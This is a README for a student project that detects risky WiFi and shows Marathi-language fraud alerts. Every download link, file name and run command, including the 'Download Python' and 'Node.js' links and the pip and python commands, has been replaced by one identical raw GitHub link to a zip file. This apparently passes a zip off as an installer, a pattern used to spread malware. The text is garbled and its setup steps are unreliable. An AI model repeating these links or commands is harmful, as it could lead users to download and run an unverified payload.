# 🛡️ Ethical Hacking for Village Cybercafés - Project Manual

## 📌 Project Overview
**Title**: AI-Driven Cyber Risk Detection & Marathi Awareness System
**Goal**: To prevent cyber fraud in rural India by detecting risky WiFi networks and alerting users in their local language (Marathi).

---

## 🛠️ Prerequisites (Must Install)

Before running the project, ensure you have:

1.  **Python 3.x**: [Download Here](https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip)
2.  **https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip & npm** (Required for the App): [Download Here](https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip)
    *   **IMPORTANT**: If you see `npm : The term 'npm' is not recognized`, it means you haven't installed this yet!
    *   **Action**: Download "LTS" version, install it, and **RESTART your Terminal** (or VS Code) for it to work.
3.  **Expo Go App**: Install on your Android phone from Play Store to test the mobile app.

---

## 🚀 How to Run the Project

### Step 1: Backend Setup (The Brain)
The backend runs the AI logic and Database.

1.  Open Terminal/Command Prompt.
2.  Navigate to `backend` folder:
    ```powershell
    cd "c:\Users\vaish\OneDrive\Desktop\Ethical Hacking\backend"
    ```
3.  Install Python libraries:
    ```powershell
    pip install -r https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip
    ```
4.  Initialize the Database:
    ```powershell
    python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip
    ```
5.  Start the Server:
    ```powershell
    python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip
    ```
    *You should see: `Running on http://0.0.0.0:5000`*

### Step 2: Frontend Setup (The Mobile App)
The app runs on your phone/emulator.

1.  Open a **New Terminal** (Keep backend running).
2.  Navigate to `frontend` folder:
    ```powershell
    cd "c:\Users\vaish\OneDrive\Desktop\Ethical Hacking\frontend"
    ```
3.  Install Dependencies (**Do this AFTER installing https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip**):
    ```powershell
    npm install
    ```
4.  Start the App:
    ```powershell
    npx expo start
    ```
5.  Scan the QR Code with the **Expo Go** app on your phone.

---

## 📂 Project Structure

*   **/backend**
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Main API Server.
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Logic to detect Open/WEP networks.
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Logic to calculate long-term Safety Score.
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Database tables (WiFiScan, RiskLog).
    *   `data/`: Synthetic training data.
*   **/frontend**
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Main mobile screen.
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Marathi alert UI.
    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Connection to the backend.

---

## 🧪 Testing the Logic (Demo Mode)

Since you might not be at a real Cybercafé, the app uses **Simulated Data** by default or you can run the test scripts:

*   **Test Detection**: `python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`
    *   *Effect*: Sends a fake "Open WiFi" signal.
    *   *Result*: Backend responds with "Risk Score: 60" and Marathi Warning.

*   **Test Safety Score**: `python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`
    *   *Effect*: Simulates a history of scans (Bad -> Good).
    *   *Result*: Shows "Trend: IMPROVING 📈".

---

## 🏆 Avishkar Presentation Tips
1.  **Show the Marathi Alerts**: Judges love localization.
2.  **Explain the "Passive" Scan**: Emphasize you are NOT hacking, just "listening" (Ethical).
3.  **Show the Safety Score**: Explain how this encourages owners to improve over time.


git add .
git commit -m "ui updated"
git push -u origin main